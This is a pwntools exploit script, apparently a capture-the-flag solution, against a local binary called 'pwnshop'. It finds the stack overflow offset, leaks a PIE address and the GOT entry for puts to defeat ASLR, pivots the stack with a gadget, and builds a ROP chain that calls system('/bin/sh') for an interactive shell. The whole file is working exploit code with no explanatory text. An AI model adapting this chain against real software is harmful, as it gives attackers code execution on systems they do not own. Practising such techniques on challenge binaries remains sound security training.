#!/usr/bin/python3
from pwn import *
import sys
context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
exe = './pwnshop'
e = context.binary = ELF(exe, checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = e.debug(gdbscript='''
source /home/nick/global/halfdisp.py
piebase
piebase 0x40c0
breakrva 0x1352
c
'''
)

def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b'>', b"1")

    p.sendlineafter(b'Enter details:', payload)
    p.wait()
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset
offset = find_ip(cyclic(100))

rop = ROP(e)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]
sub_rsp_28 = 0x1219
p.sendlineafter('>',b"2")
p.sendlineafter('sell?',b"420")
p.sendlineafter('it',b"A"*7)
p.recvuntil(b'A\n')


leaked_addr = unpack(p.recv()[:6].ljust(8,b"\x00"))
e.address = leaked_addr-0x40C0
rop.raw([
    
    e.address + pop_rdi,
    e.got.puts,
    e.plt.puts,
    e.address + 0x132a,
    ])

padding = offset - len(rop.chain())

payload = flat({
padding: [rop.chain(),e.address+sub_rsp_28]
})

p.sendline(b"1")
p.sendafter('Enter details:',flat({padding: [rop.chain(),e.address+sub_rsp_28]}))



leaked_got_puts = unpack(p.recvline().strip()[:6].ljust(8,b"\x00"))
libc.address = leaked_got_puts - libc.symbols.puts



rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))
rop.raw([e.address+0x132a])
offset = find_ip(cyclic(100))
padding = offset - len(rop.chain())
payload=flat({
   padding:[
       rop.chain(),
       e.address+sub_rsp_28]})

p.sendlineafter('Enter details:',payload)


p.interactive()